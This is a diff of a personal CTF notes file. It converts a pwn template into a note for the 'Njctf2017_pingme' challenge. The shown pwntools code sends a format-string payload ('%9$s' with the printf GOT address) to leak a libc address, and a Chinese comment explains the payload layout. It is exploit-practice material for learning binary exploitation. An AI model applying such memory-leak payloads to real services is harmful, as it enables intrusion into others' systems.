@@ -1,14 +1,14 @@
 ---
-id: 6czaktejjj80bj1udleo8rj
-title: Template
+id: epxdpi05tjyaz9lk4o0bfa0
+title: Njctf2017_pingme
 desc: ''
-updated: 1672232545966
-created: 1672064406757
+updated: 1672232485842
+created: 1672228677711
 ---
 
-## pwn题模板
 
 ```py
+
 from pwn import * 
 import os
 # ========================================
@@ -100,7 +100,10 @@ ia  = io.interactive
 ic  = io.close
 cr  = io.can_recv
 
+
+
 buffer_padding = lambda offset : offset*'A'
+
 
 def exec_fmt(payload):
     io.sendline(payload)
@@ -144,6 +147,7 @@ S()
 # debug(gdbscript="b *main\r\nb printf")
 # print(hex(elf.got["printf"]))
 printf_got = elf.got["printf"]
+# 数字在后面，前面为字符串，防止被截断，AAA在后面为了使用ru(".AAA")，利于定位，如果是".AAA%9$s",不利于定位
 payload = b"%9$s.AAA" + p32(printf_got)
 rl()
 sl(payload)
@@ -152,6 +156,9 @@ printf_addr = u32(data)
 log.info("printf address: %s" % hex(printf_addr))
 
 
+
 ia()
 # S()
+
+
 ```
